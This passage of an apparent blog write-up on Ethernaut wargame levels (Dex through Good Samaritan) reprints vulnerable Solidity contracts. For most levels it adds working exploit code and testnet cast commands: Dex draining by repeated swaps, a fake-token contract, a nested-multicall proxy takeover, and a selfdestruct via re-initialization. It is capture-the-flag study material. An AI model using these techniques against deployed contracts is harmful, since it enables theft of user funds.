+</span><span>    SwappableToken(token1).approve(msg.sender, spender, amount);
+</span><span>    SwappableToken(token2).approve(msg.sender, spender, amount);
+</span><span>  }
+</span><span>
+</span><span>  function balanceOf(address token, address account) public view returns (uint){
+</span><span>    return IERC20(token).balanceOf(account);
+</span><span>  }
+</span><span>}
+</span><span>
+</span><span>contract SwappableToken is ERC20 {
+</span><span>  address private _dex;
+</span><span>  constructor(address dexInstance, string memory name, string memory symbol, uint256 initialSupply) ERC20(name, symbol) {
+</span><span>        _mint(msg.sender, initialSupply);
+</span><span>        _dex = dexInstance;
+</span><span>  }
+</span><span>
+</span><span>  function approve(address owner, address spender, uint256 amount) public {
+</span><span>    require(owner != _dex, "InvalidApprover");
+</span><span>    super._approve(owner, spender, amount);
+</span><span>  }
+</span><span>}
+</span></code></pre><p>logical vulnerability. The calculation logic of the function <code>getSwapPrice</code> allows us to get more tokens by converting between two tokens<pre class=language-solidity data-lang=solidity style=background:#2e3440;color:#d8dee9><code class=language-solidity data-lang=solidity><span>let token1 = await contract.token1();
+</span><span>let token2 = await contract.token2();
+</span><span>await contract.approve(instance, 1000);
+</span><span>await contract.swap(token1, token2, 10);
+</span><span>await contract.swap(token2, token1, 20);
+</span><span>await contract.swap(token1, token2, 24);
+</span><span>await contract.swap(token2, token1, 30);
+</span><span>await contract.swap(token1, token2, 41);
+</span><span>await contract.swap(token2, token1, 45); 
+</span><span>
+</span><span>await contract.balanceOf(token1, instance);
+</span><span>await contract.balanceOf(token2, instance);
+</span></code></pre><h2 id=dex-two>Dex Two</h2><pre class=language-solidity data-lang=solidity style=background:#2e3440;color:#d8dee9><code class=language-solidity data-lang=solidity><span>// SPDX-License-Identifier: MIT
+</span><span>pragma solidity ^0.8.0;
+</span><span>
+</span><span>import "openzeppelin-contracts-08/token/ERC20/IERC20.sol";
+</span><span>import "openzeppelin-contracts-08/token/ERC20/ERC20.sol";
+</span><span>import 'openzeppelin-contracts-08/access/Ownable.sol';
+</span><span>
+</span><span>contract DexTwo is Ownable {
+</span><span>  address public token1;
+</span><span>  address public token2;
+</span><span>  constructor() {}
+</span><span>
+</span><span>  function setTokens(address _token1, address _token2) public onlyOwner {
+</span><span>    token1 = _token1;
+</span><span>    token2 = _token2;
+</span><span>  }
+</span><span>
+</span><span>  function add_liquidity(address token_address, uint amount) public onlyOwner {
+</span><span>    IERC20(token_address).transferFrom(msg.sender, address(this), amount);
+</span><span>  }
+</span><span>  
+</span><span>  function swap(address from, address to, uint amount) public {
+</span><span>    require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
+</span><span>    uint swapAmount = getSwapAmount(from, to, amount);
+</span><span>    IERC20(from).transferFrom(msg.sender, address(this), amount);
+</span><span>    IERC20(to).approve(address(this), swapAmount);
+</span><span>    IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
+</span><span>  } 
+</span><span>
+</span><span>  function getSwapAmount(address from, address to, uint amount) public view returns(uint){
+</span><span>    return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));
+</span><span>  }
+</span><span>
+</span><span>  function approve(address spender, uint amount) public {
+</span><span>    SwappableTokenTwo(token1).approve(msg.sender, spender, amount);
+</span><span>    SwappableTokenTwo(token2).approve(msg.sender, spender, amount);
+</span><span>  }
+</span><span>
+</span><span>  function balanceOf(address token, address account) public view returns (uint){
+</span><span>    return IERC20(token).balanceOf(account);
+</span><span>  }
+</span><span>}
+</span><span>
+</span><span>contract SwappableTokenTwo is ERC20 {
+</span><span>  address private _dex;
+</span><span>  constructor(address dexInstance, string memory name, string memory symbol, uint initialSupply) ERC20(name, symbol) {
+</span><span>        _mint(msg.sender, initialSupply);
+</span><span>        _dex = dexInstance;
+</span><span>  }
+</span><span>
+</span><span>  function approve(address owner, address spender, uint256 amount) public {
+</span><span>    require(owner != _dex, "InvalidApprover");
+</span><span>    super._approve(owner, spender, amount);
+</span><span>  }
+</span><span>}
+</span></code></pre><p>Only swap function have modified a little. thats mean we could specify a evil contract address to swap the real token.<pre class=language-solidity data-lang=solidity style=background:#2e3440;color:#d8dee9><code class=language-solidity data-lang=solidity><span>// SPDX-License-Identifier: MIT
+</span><span>pragma solidity ^0.8.0;
+</span><span>
+</span><span>contract exp {
+</span><span>    function approve(address spender, uint256 value) external returns (bool) {
+</span><span>        return true;
+</span><span>    }
+</span><span>    function transferFrom(address from, address to, uint256 value) external returns (bool) {
+</span><span>        return true;
+</span><span>    }
+</span><span>    function balanceOf(address account) external view returns (uint256) {
+</span><span>        return uint256(10);
+</span><span>    }
+</span><span>    function receive() external payable { }
+</span><span>}
+</span></code></pre><pre class=language-solidity data-lang=solidity style=background:#2e3440;color:#d8dee9><code class=language-solidity data-lang=solidity><span>let token1 = await contract.token1();
+</span><span>let token2 = await contract.token2();
+</span><span>let exp = '0x3327f08D1BaA8076C5f185DE898667fdF7D2D96F';
+</span><span>await contract.swap(exp, token1, 10);
+</span><span>await contract.swap(exp, token2, 10);
+</span></code></pre><h2 id=puzzle-wallet>Puzzle Wallet</h2><pre class=language-solidity data-lang=solidity style=background:#2e3440;color:#d8dee9><code class=language-solidity data-lang=solidity><span>// SPDX-License-Identifier: MIT
+</span><span>pragma solidity ^0.8.0;
+</span><span>pragma experimental ABIEncoderV2;
+</span><span>
+</span><span>import "../helpers/UpgradeableProxy-08.sol";
+</span><span>
+</span><span>contract PuzzleProxy is UpgradeableProxy {
+</span><span>    address public pendingAdmin;
+</span><span>    address public admin;
+</span><span>
+</span><span>    constructor(address _admin, address _implementation, bytes memory _initData) UpgradeableProxy(_implementation, _initData) {
+</span><span>        admin = _admin;
+</span><span>    }
+</span><span>
+</span><span>    modifier onlyAdmin {
+</span><span>      require(msg.sender == admin, "Caller is not the admin");
+</span><span>      _;
+</span><span>    }
+</span><span>
+</span><span>    function proposeNewAdmin(address _newAdmin) external {
+</span><span>        pendingAdmin = _newAdmin;
+</span><span>    }
+</span><span>
+</span><span>    function approveNewAdmin(address _expectedAdmin) external onlyAdmin {
+</span><span>        require(pendingAdmin == _expectedAdmin, "Expected new admin by the current admin is not the pending admin");
+</span><span>        admin = pendingAdmin;
+</span><span>    }
+</span><span>
+</span><span>    function upgradeTo(address _newImplementation) external onlyAdmin {
+</span><span>        _upgradeTo(_newImplementation);
+</span><span>    }
+</span><span>}
+</span><span>
+</span><span>contract PuzzleWallet {
+</span><span>    address public owner;
+</span><span>    uint256 public maxBalance;
+</span><span>    mapping(address => bool) public whitelisted;
+</span><span>    mapping(address => uint256) public balances;
+</span><span>
+</span><span>    function init(uint256 _maxBalance) public {
+</span><span>        require(maxBalance == 0, "Already initialized");
+</span><span>        maxBalance = _maxBalance;
+</span><span>        owner = msg.sender;
+</span><span>    }
+</span><span>
+</span><span>    modifier onlyWhitelisted {
+</span><span>        require(whitelisted[msg.sender], "Not whitelisted");
+</span><span>        _;
+</span><span>    }
+</span><span>
+</span><span>    function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted {
+</span><span>      require(address(this).balance == 0, "Contract balance is not 0");
+</span><span>      maxBalance = _maxBalance;
+</span><span>    }
+</span><span>
+</span><span>    function addToWhitelist(address addr) external {
+</span><span>        require(msg.sender == owner, "Not the owner");
+</span><span>        whitelisted[addr] = true;
+</span><span>    }
+</span><span>
+</span><span>    function deposit() external payable onlyWhitelisted {
+</span><span>      require(address(this).balance <= maxBalance, "Max balance reached");
+</span><span>      balances[msg.sender] += msg.value;
+</span><span>    }
+</span><span>
+</span><span>    function execute(address to, uint256 value, bytes calldata data) external payable onlyWhitelisted {
+</span><span>        require(balances[msg.sender] >= value, "Insufficient balance");
+</span><span>        balances[msg.sender] -= value;
+</span><span>        (bool success, ) = to.call{ value: value }(data);
+</span><span>        require(success, "Execution failed");
+</span><span>    }
+</span><span>
+</span><span>    function multicall(bytes[] calldata data) external payable onlyWhitelisted {
+</span><span>        bool depositCalled = false;
+</span><span>        for (uint256 i = 0; i < data.length; i++) {
+</span><span>            bytes memory _data = data[i];
+</span><span>            bytes4 selector;
+</span><span>            assembly {
+</span><span>                selector := mload(add(_data, 32))
+</span><span>            }
+</span><span>            if (selector == this.deposit.selector) {
+</span><span>                require(!depositCalled, "Deposit can only be called once");
+</span><span>                // Protect against reusing msg.value
+</span><span>                depositCalled = true;
+</span><span>            }
+</span><span>            (bool success, ) = address(this).delegatecall(data[i]);
+</span><span>            require(success, "Error while delegating call");
+</span><span>        }
+</span><span>    }
+</span><span>}
+</span></code></pre><ol><li><p>The two contracts use different memory layout, means that its able to use <code>pendingAdmin</code> to override puzzleWallet’s <code>owner</code>, then add us to whiteList to allow other methods to be used.</p><li><p>Call multicall inside another multicall, to bypass the restriction of selector, and get Balance more than we exactly deposited. (reuse <code>msg.value</code>)</p><li><p>Call <code>Execute</code> to run out the balance of the contract, and use <code>setMaxBalance</code> to override the memory of PuzzleProxy’s <code>admin</code> to finish this level.</p></ol><pre class=language-solidity data-lang=solidity style=background:#2e3440;color:#d8dee9><code class=language-solidity data-lang=solidity><span>contract exp {
+</span><span>    PuzzleWallet puzzleWallet;
+</span><span>    constructor(address _address) {
+</span><span>        puzzleWallet = PuzzleWallet(_address);
+</span><span>    }
+</span><span>    
+</span><span>    function attack () external payable {
+</span><span>        require(msg.value == 0.001 ether, "not enough");
+</span><span>        bytes[] memory callsDeep = new bytes[](1);
+</span><span>        callsDeep[0] = abi.encodeWithSelector(PuzzleWallet.deposit.selector);
+</span><span>
+</span><span>        bytes[] memory calls = new bytes[](2);
+</span><span>        calls[0] = abi.encodeWithSelector(PuzzleWallet.deposit.selector);
+</span><span>        calls[1] = abi.encodeWithSelector(PuzzleWallet.multicall.selector, callsDeep);
+</span><span>        puzzleWallet.multicall{value: 0.001 ether}(calls);
+</span><span>        puzzleWallet.execute(address(0xe24C5c44a7c4E75d5E2e461C35d863db0385E3c9), 0.002 ether, "");
+</span><span>        puzzleWallet.setMaxBalance(uint256(uint160(0xe24C5c44a7c4E75d5E2e461C35d863db0385E3c9)));
+</span><span>    }
+</span><span>}
+</span></code></pre><pre class=language-bash data-lang=bash style=background:#2e3440;color:#d8dee9><code class=language-bash data-lang=bash><span style=color:#88c0d0>cast</span><span> send 0xAcec6Aab5D50A0Ed7Bc4966Fdf176258E0B99D78 </span><span style=color:#a3be8c>"proposeNewAdmin(address)"</span><span> -r https://1rpc.io/sepolia --private-key </span><span style=color:#81a1c1>$</span><span>PRVT</span><span style=color:#81a1c1> -- </span><span style=color:#a3be8c>"0xe24C5c44a7c4E75d5E2e461C35d863db0385E3c9"
+</span><span>
+</span><span style=color:#88c0d0>cast</span><span> send 0xAcec6Aab5D50A0Ed7Bc4966Fdf176258E0B99D78 </span><span style=color:#a3be8c>"addToWhitelist(address)"</span><span> -r https://1rpc.io/sepolia --private-key </span><span style=color:#81a1c1>$</span><span>PRVT</span><span style=color:#81a1c1> -- </span><span style=color:#a3be8c>"0xe24C5c44a7c4E75d5E2e461C35d863db0385E3c9"
+</span><span>
+</span><span style=color:#88c0d0>cast</span><span> send 0xAcec6Aab5D50A0Ed7Bc4966Fdf176258E0B99D78 </span><span style=color:#a3be8c>"addToWhitelist(address)"</span><span> -r https://1rpc.io/sepolia --private-key </span><span style=color:#81a1c1>$</span><span>PRVT</span><span style=color:#81a1c1> -- </span><span style=color:#a3be8c>"0x90d93e6BEaE54B4f6B1E655cA5C5A8F95daF27C4"
+</span><span>
+</span><span style=color:#88c0d0>cast</span><span> send 0x90d93e6BEaE54B4f6B1E655cA5C5A8F95daF27C4 </span><span style=color:#a3be8c>"attack()"</span><span> -r https://1rpc.io/sepolia --private-key </span><span style=color:#81a1c1>$</span><span>PRVT --value 1000000000000000
+</span></code></pre><h2 id=motorbike>Motorbike</h2><pre class=language-solidity data-lang=solidity style=background:#2e3440;color:#d8dee9><code class=language-solidity data-lang=solidity><span>// SPDX-License-Identifier: MIT
+</span><span>
+</span><span>pragma solidity &LT0.7.0;
+</span><span>
+</span><span>import "openzeppelin-contracts-06/utils/Address.sol";
+</span><span>import "openzeppelin-contracts-06/proxy/Initializable.sol";
+</span><span>
+</span><span>contract Motorbike {
+</span><span>    // keccak-256 hash of "eip1967.proxy.implementation" subtracted by 1
+</span><span>    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
+</span><span>    
+</span><span>    struct AddressSlot {
+</span><span>        address value;
+</span><span>    }
+</span><span>    
+</span><span>    // Initializes the upgradeable proxy with an initial implementation specified by `_logic`.
+</span><span>    constructor(address _logic) public {
+</span><span>        require(Address.isContract(_logic), "ERC1967: new implementation is not a contract");
+</span><span>        _getAddressSlot(_IMPLEMENTATION_SLOT).value = _logic;
+</span><span>        (bool success,) = _logic.delegatecall(
+</span><span>            abi.encodeWithSignature("initialize()")
+</span><span>        );
+</span><span>        require(success, "Call failed");
+</span><span>    }
+</span><span>
+</span><span>    // Delegates the current call to `implementation`.
+</span><span>    function _delegate(address implementation) internal virtual {
+</span><span>        // solhint-disable-next-line no-inline-assembly
+</span><span>        assembly {
+</span><span>            calldatacopy(0, 0, calldatasize())
+</span><span>            let result := delegatecall(gas(), implementation, 0, calldatasize(), 0, 0)
+</span><span>            returndatacopy(0, 0, returndatasize())
+</span><span>            switch result
+</span><span>            case 0 { revert(0, returndatasize()) }
+</span><span>            default { return(0, returndatasize()) }
+</span><span>        }
+</span><span>    }
+</span><span>
+</span><span>    // Fallback function that delegates calls to the address returned by `_implementation()`. 
+</span><span>    // Will run if no other function in the contract matches the call data
+</span><span>    fallback () external payable virtual {
+</span><span>        _delegate(_getAddressSlot(_IMPLEMENTATION_SLOT).value);
+</span><span>    }
+</span><span>
+</span><span>    // Returns an `AddressSlot` with member `value` located at `slot`.
+</span><span>    function _getAddressSlot(bytes32 slot) internal pure returns (AddressSlot storage r) {
+</span><span>        assembly {
+</span><span>            r_slot := slot
+</span><span>        }
+</span><span>    }
+</span><span>}
+</span><span>
+</span><span>contract Engine is Initializable {
+</span><span>    // keccak-256 hash of "eip1967.proxy.implementation" subtracted by 1
+</span><span>    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
+</span><span>
+</span><span>    address public upgrader;
+</span><span>    uint256 public horsePower;
+</span><span>
+</span><span>    struct AddressSlot {
+</span><span>        address value;
+</span><span>    }
+</span><span>
+</span><span>    function initialize() external initializer {
+</span><span>        horsePower = 1000;
+</span><span>        upgrader = msg.sender;
+</span><span>    }
+</span><span>
+</span><span>    // Upgrade the implementation of the proxy to `newImplementation`
+</span><span>    // subsequently execute the function call
+</span><span>    function upgradeToAndCall(address newImplementation, bytes memory data) external payable {
+</span><span>        _authorizeUpgrade();
+</span><span>        _upgradeToAndCall(newImplementation, data);
+</span><span>    }
+</span><span>
+</span><span>    // Restrict to upgrader role
+</span><span>    function _authorizeUpgrade() internal view {
+</span><span>        require(msg.sender == upgrader, "Can't upgrade");
+</span><span>    }
+</span><span>
+</span><span>    // Perform implementation upgrade with security checks for UUPS proxies, and additional setup call.
+</span><span>    function _upgradeToAndCall(
+</span><span>        address newImplementation,
+</span><span>        bytes memory data
+</span><span>    ) internal {
+</span><span>        // Initial upgrade and setup call
+</span><span>        _setImplementation(newImplementation);
+</span><span>        if (data.length > 0) {
+</span><span>            (bool success,) = newImplementation.delegatecall(data);
+</span><span>            require(success, "Call failed");
+</span><span>        }
+</span><span>    }
+</span><span>    
+</span><span>    // Stores a new address in the EIP1967 implementation slot.
+</span><span>    function _setImplementation(address newImplementation) private {
+</span><span>        require(Address.isContract(newImplementation), "ERC1967: new implementation is not a contract");
+</span><span>        
+</span><span>        AddressSlot storage r;
+</span><span>        assembly {
+</span><span>            r_slot := _IMPLEMENTATION_SLOT
+</span><span>        }
+</span><span>        r.value = newImplementation;
+</span><span>    }
+</span><span>}
+</span></code></pre><p>Not properly initialized. It means that the specified upgrader can be initialized again at the implementation address<pre class=language-solidity data-lang=solidity style=background:#2e3440;color:#d8dee9><code class=language-solidity data-lang=solidity><span>// SPDX-License-Identifier: MIT
+</span><span>// deployed at 0x95800066C789e89C33f6Bac781fF16795e0922af
+</span><span>pragma solidity 0.8.0;
+</span><span>
+</span><span>contract exp {
+</span><span>  function suic1de() public {
+</span><span>    selfdestruct(payable(address(0)));
+</span><span>  }
+</span><span>}
+</span></code></pre><pre class=language-bash data-lang=bash style=background:#2e3440;color:#d8dee9><code class=language-bash data-lang=bash><span style=color:#81a1c1>> </span><span>(</span><span style=color:#88c0d0>await</span><span> web3.eth.getStorageAt(instance, </span><span style=color:#a3be8c>'0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc'</span><span>).then(v=</span><span style=color:#81a1c1>></span><span>v.toString()))</span><span style=color:#88c0d0>.slice</span><span>(26)
+</span><span style=color:#81a1c1>< </span><span style=color:#b48ead>0</span><span style=color:#88c0d0>x5b7a5f495f79df6b2f71658eb49c7cbd8eb81746
+</span></code></pre><pre class=language-solidity data-lang=solidity style=background:#2e3440;color:#d8dee9><code class=language-solidity data-lang=solidity><span>root@aliyunhk:~# cast send 0x5b7a5f495f79df6b2f71658eb49c7cbd8eb81746 "initialize()" --rpc-url https://1rpc.io/sepolia --private-key $PRVT
+</span><span>root@aliyunhk:~# cast call 0x5b7a5f495f79df6b2f71658eb49c7cbd8eb81746 "upgrader()" --rpc-url https://1rpc.io/sepolia
+</span><span>root@aliyunhk:~# chisel
+</span><span>Welcome to Chisel! Type `!help` to show available commands.
+</span><span>➜ bytes memory a = abi.encodeWithSelector(bytes4(keccak256("suic1de()")))
+</span><span>➜ a
+</span><span>Type: dynamic bytes
+</span><span>├ Hex (Memory):
+</span><span>├─ Length ([0x00:0x20]): 0x0000000000000000000000000000000000000000000000000000000000000004
+</span><span>├─ Contents ([0x20:..]): 0x82617c2f00000000000000000000000000000000000000000000000000000000
+</span><span>├ Hex (Tuple Encoded):
+</span><span>├─ Pointer ([0x00:0x20]): 0x0000000000000000000000000000000000000000000000000000000000000020
+</span><span>├─ Length ([0x20:0x40]): 0x0000000000000000000000000000000000000000000000000000000000000004
+</span><span>└─ Contents ([0x40:..]): 0x82617c2f00000000000000000000000000000000000000000000000000000000
+</span><span>root@aliyunhk:~# cast send 0x5b7a5f495f79df6b2f71658eb49c7cbd8eb81746 "upgradeToAndCall(address,bytes memory)" --rpc-url https://1rpc.io/sepolia --private-key $PRVT -- 0x95800066C789e89C33f6Bac781fF16795e0922af 0x82617c2f
+</span></code></pre><h2 id=doubleentrypoint>DoubleEntryPoint</h2><pre class=language-solidity data-lang=solidity style=background:#2e3440;color:#d8dee9><code class=language-solidity data-lang=solidity><span>// SPDX-License-Identifier: MIT
+</span><span>pragma solidity ^0.8.0;
+</span><span>
+</span><span>import "openzeppelin-contracts-08/access/Ownable.sol";
+</span><span>import "openzeppelin-contracts-08/token/ERC20/ERC20.sol";
+</span><span>
+</span><span>interface DelegateERC20 {
+</span><span>  function delegateTransfer(address to, uint256 value, address origSender) external returns (bool);
+</span><span>}
+</span><span>
+</span><span>interface IDetectionBot {
+</span><span>    function handleTransaction(address user, bytes calldata msgData) external;
+</span><span>}
+</span><span>
+</span><span>interface IForta {
+</span><span>    function setDetectionBot(address detectionBotAddress) external;
+</span><span>    function notify(address user, bytes calldata msgData) external;
+</span><span>    function raiseAlert(address user) external;
+</span><span>}
+</span><span>
+</span><span>contract Forta is IForta {
+</span><span>  mapping(address => IDetectionBot) public usersDetectionBots;
+</span><span>  mapping(address => uint256) public botRaisedAlerts;
+</span><span>
+</span><span>  function setDetectionBot(address detectionBotAddress) external override {
+</span><span>      usersDetectionBots[msg.sender] = IDetectionBot(detectionBotAddress);
+</span><span>  }
+</span><span>
+</span><span>  function notify(address user, bytes calldata msgData) external override {
+</span><span>    if(address(usersDetectionBots[user]) == address(0)) return;
+</span><span>    try usersDetectionBots[user].handleTransaction(user, msgData) {
+</span><span>        return;
+</span><span>    } catch {}
+</span><span>  }
+</span><span>
+</span><span>  function raiseAlert(address user) external override {
+</span><span>      if(address(usersDetectionBots[user]) != msg.sender) return;
+</span><span>      botRaisedAlerts[msg.sender] += 1;
+</span><span>  } 
+</span><span>}
+</span><span>
+</span><span>contract CryptoVault {
+</span><span>    address public sweptTokensRecipient;
+</span><span>    IERC20 public underlying;
+</span><span>
+</span><span>    constructor(address recipient) {
+</span><span>        sweptTokensRecipient = recipient;
+</span><span>    }
+</span><span>
+</span><span>    function setUnderlying(address latestToken) public {
+</span><span>        require(address(underlying) == address(0), "Already set");
+</span><span>        underlying = IERC20(latestToken);
+</span><span>    }
+</span><span>
+</span><span>    /*
+</span><span>    ...
+</span><span>    */
+</span><span>
+</span><span>    function sweepToken(IERC20 token) public {
+</span><span>        require(token != underlying, "Can't transfer underlying token");
+</span><span>        token.transfer(sweptTokensRecipient, token.balanceOf(address(this)));
+</span><span>    }
+</span><span>}
+</span><span>
+</span><span>contract LegacyToken is ERC20("LegacyToken", "LGT"), Ownable {
+</span><span>    DelegateERC20 public delegate;
+</span><span>
+</span><span>    function mint(address to, uint256 amount) public onlyOwner {
+</span><span>        _mint(to, amount);
+</span><span>    }
+</span><span>
+</span><span>    function delegateToNewContract(DelegateERC20 newContract) public onlyOwner {
+</span><span>        delegate = newContract;
+</span><span>    }
+</span><span>
+</span><span>    function transfer(address to, uint256 value) public override returns (bool) {
+</span><span>        if (address(delegate) == address(0)) {
+</span><span>            return super.transfer(to, value);
+</span><span>        } else {
+</span><span>            return delegate.delegateTransfer(to, value, msg.sender);
+</span><span>        }
+</span><span>    }
+</span><span>}
+</span><span>
+</span><span>contract DoubleEntryPoint is ERC20("DoubleEntryPointToken", "DET"), DelegateERC20, Ownable {
+</span><span>    address public cryptoVault;
+</span><span>    address public player;
+</span><span>    address public delegatedFrom;
+</span><span>    Forta public forta;
+</span><span>
+</span><span>    constructor(address legacyToken, address vaultAddress, address fortaAddress, address playerAddress) {
+</span><span>        delegatedFrom = legacyToken;
+</span><span>        forta = Forta(fortaAddress);
+</span><span>        player = playerAddress;
+</span><span>        cryptoVault = vaultAddress;
+</span><span>        _mint(cryptoVault, 100 ether);
+</span><span>    }
+</span><span>
+</span><span>    modifier onlyDelegateFrom() {
+</span><span>        require(msg.sender == delegatedFrom, "Not legacy contract");
+</span><span>        _;
+</span><span>    }
+</span><span>
+</span><span>    modifier fortaNotify() {
+</span><span>        address detectionBot = address(forta.usersDetectionBots(player));
+</span><span>
+</span><span>        // Cache old number of bot alerts
+</span><span>        uint256 previousValue = forta.botRaisedAlerts(detectionBot);
+</span><span>
+</span><span>        // Notify Forta
+</span><span>        forta.notify(player, msg.data);
+</span><span>
+</span><span>        // Continue execution
+</span><span>        _;
+</span><span>
+</span><span>        // Check if alarms have been raised
+</span><span>        if(forta.botRaisedAlerts(detectionBot) > previousValue) revert("Alert has been triggered, reverting");
+</span><span>    }
+</span><span>
+</span><span>    function delegateTransfer(
+</span><span>        address to,
+</span><span>        uint256 value,
+</span><span>        address origSender
+</span><span>    ) public override onlyDelegateFrom fortaNotify returns (bool) {
+</span><span>        _transfer(origSender, to, value);
+</span><span>        return true;
+</span><span>    }
+</span><span>}
+</span></code></pre><p>There’s totally 5 contracts paticipated in this challenge. After sorting, the relationship diagram and call flow chart drawn are as follows:<p><img alt=DoubleEntryPoint src=/blog/ethernaut/Ethernaut/DoubleEntryPoint.svg><p>And at the end of tx, CA <code>ERC20 DET</code> would check if the <code>raiseAlert</code> has been triggered. And if it’s ture the tx would be revert. (which I haven’t mentioned in the picture).<p>To solve this challenge just write a <code>DetectionBot</code> to avoid the <code>CryptoVault</code> being drained out of tokens.<pre class=language-solidity data-lang=solidity style=background:#2e3440;color:#d8dee9><code class=language-solidity data-lang=solidity><span>// SPDX-License-Identifier: MIT
+</span><span>pragma solidity ^0.6.0;
+</span><span>
+</span><span>interface IDetectionBot {
+</span><span>    function handleTransaction(address user, bytes calldata msgData) external;
+</span><span>}
+</span><span>
+</span><span>interface IForta {
+</span><span>    function setDetectionBot(address detectionBotAddress) external;
+</span><span>    function notify(address user, bytes calldata msgData) external;
+</span><span>    function raiseAlert(address user) external;
+</span><span>}
+</span><span>
+</span><span>contract DetectionBot is IDetectionBot {
+</span><span>    address cryptoVault;
+</span><span>
+</span><span>    constructor(address _cryptoVault) public {
+</span><span>        cryptoVault = _cryptoVault;
+</span><span>    }
+</span><span>
+</span><span>    function handleTransaction(address user, bytes calldata msgData) external override {
+</span><span>
+</span><span>        address origSender;
+</span><span>        assembly {
+</span><span>            // select `origSender` from calldata. 
+</span><span>            // https://docs.soliditylang.org/en/v0.8.15/abi-spec.html#abi.
+</span><span>            // could see others writeup for details :D
+</span><span>            origSender := calldataload(0xa8)
+</span><span>        }
+</span><span>
+</span><span>        if(origSender == cryptoVault) {
+</span><span>            IForta(msg.sender).raiseAlert(user);
+</span><span>        }
+</span><span>    }
+</span><span>}
+</span></code></pre><pre class=language-js data-lang=js style=background:#2e3440;color:#d8dee9><code class=language-js data-lang=js><span style=color:#81a1c1>< await </span><span>contract</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>forta</span><span>()
+</span><span style=color:#81a1c1>> </span><span style=color:#a3be8c>'0x902389eFE38022B065DFBFB4D9F9F065aC1d7004'
+</span><span style=color:#81a1c1>< await </span><span>contract</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>cryptoVault</span><span>()
+</span><span style=color:#81a1c1>> </span><span style=color:#a3be8c>'0xd402609c99EC210563e32b24934b7FF98dF3f4c0'
+</span></code></pre><pre class=language-bash data-lang=bash style=background:#2e3440;color:#d8dee9><code class=language-bash data-lang=bash><span style=color:#88c0d0>cast</span><span> send 0x902389eFE38022B065DFBFB4D9F9F065aC1d7004 </span><span style=color:#a3be8c>"setDetectionBot(address)"</span><span> --rpc-url https://1rpc.io/sepolia --private-key </span><span style=color:#81a1c1>$</span><span>PRVT</span><span style=color:#81a1c1> --</span><span> 0xCf5D488ff4Ec2Ce88dE6a823bFE6C080BB35523C
+</span></code></pre><h2 id=good-samaritan>Good Samaritan</h2><pre class=language-solidity data-lang=solidity style=background:#2e3440;color:#d8dee9><code class=language-solidity data-lang=solidity><span>// SPDX-License-Identifier: MIT
+</span><span>pragma solidity >=0.8.0 &LT0.9.0;
+</span><span>
+</span><span>import "openzeppelin-contracts-08/utils/Address.sol";
+</span><span>
+</span><span>contract GoodSamaritan {
+</span><span>    Wallet public wallet;
+</span><span>    Coin public coin;
+</span><span>
+</span><span>    constructor() {
+</span><span>        wallet = new Wallet();
+</span><span>        coin = new Coin(address(wallet));
+</span><span>
+</span><span>        wallet.setCoin(coin);
+</span><span>    }
+</span><span>
+</span><span>    function requestDonation() external returns(bool enoughBalance){
+</span><span>        // donate 10 coins to requester
+</span><span>        try wallet.donate10(msg.sender) {
+</span><span>            return true;
+</span><span>        } catch (bytes memory err) {
+</span><span>            if (keccak256(abi.encodeWithSignature("NotEnoughBalance()")) == keccak256(err)) {
+</span><span>                // send the coins left
+</span><span>                wallet.transferRemainder(msg.sender);
+</span><span>                return false;
+</span><span>            }
+</span><span>        }
+</span><span>    }
+</span><span>}
+</span><span>
+</span><span>contract Coin {
+</span><span>    using Address for address;
+</span><span>
+</span><span>    mapping(address => uint256) public balances;
+</span><span>
+</span><span>    error InsufficientBalance(uint256 current, uint256 required);
+</span><span>
+</span><span>    constructor(address wallet_) {
+</span><span>        // one million coins for Good Samaritan initially
+</span><span>        balances[wallet_] = 10**6;
+</span><span>    }
+</span><span>
+</span><span>    function transfer(address dest_, uint256 amount_) external {
+</span><span>        uint256 currentBalance = balances[msg.sender];
+</span><span>
+</span><span>        // transfer only occurs if balance is enough
+</span><span>        if(amount_ <= currentBalance) {
+</span><span>            balances[msg.sender] -= amount_;
+</span><span>            balances[dest_] += amount_;
+</span><span>
+</span><span>            if(dest_.isContract()) {
+</span><span>                // notify contract 
+</span><span>                INotifyable(dest_).notify(amount_);
+</span><span>            }
+</span><span>        } else {
+</span><span>            revert InsufficientBalance(currentBalance, amount_);
+</span><span>        }
+</span><span>    }
+</span><span>}
+</span><span>
+</span><span>contract Wallet {
+</span><span>    // The owner of the wallet instance
+</span><span>    address public owner;
+</span><span>
+</span><span>    Coin public coin;
+</span><span>
+</span><span>    error OnlyOwner();
+</span><span>    error NotEnoughBalance();
+</span><span>
+</span><span>    modifier onlyOwner() {
+</span><span>        if(msg.sender != owner) {
+</span><span>            revert OnlyOwner();
+</span><span>        }
+</span><span>        _;
+</span><span>    }
+</span><span>
+</span><span>    constructor() {
+</span><span>        owner = msg.sender;
+</span><span>    }
+</span><span>
+</span><span>    function donate10(address dest_) external onlyOwner {
+</span><span>        // check balance left
+</span><span>        if (coin.balances(address(this)) < 10) {
+</span><span>            revert NotEnoughBalance();
+</span><span>        } else {
+</span><span>            // donate 10 coins
+</span><span>            coin.transfer(dest_, 10);
+</span><span>        }
+</span><span>    }
+</span><span>
+</span><span>    function transferRemainder(address dest_) external onlyOwner {
+</span><span>        // transfer balance left
+</span><span>        coin.transfer(dest_, coin.balances(address(this)));
+</span><span>    }
+</span><span>
+</span><span>    function setCoin(Coin coin_) external onlyOwner {
+</span><span>        coin = coin_;
+</span><span>    }
+</span><span>}
+</span><span>
+</span><span>interface INotifyable {
+</span><span>    function notify(uint256 amount) external;
+</span><span>}
+</span></code></pre><p>uh… just throw a same custom error in <code>Notifyable</code> contract. Kinda easy(?<pre class=language-solidity data-lang=solidity style=background:#2e3440;color:#d8dee9><code class=language-solidity data-lang=solidity><span>// SPDX-License-Identifier: MIT
+</span><span>pragma solidity >=0.8.0 &LT0.9.0;
+</span><span>interface IGoodSamaritan {
+</span><span>    function requestDonation() external returns (bool enoughBalance);
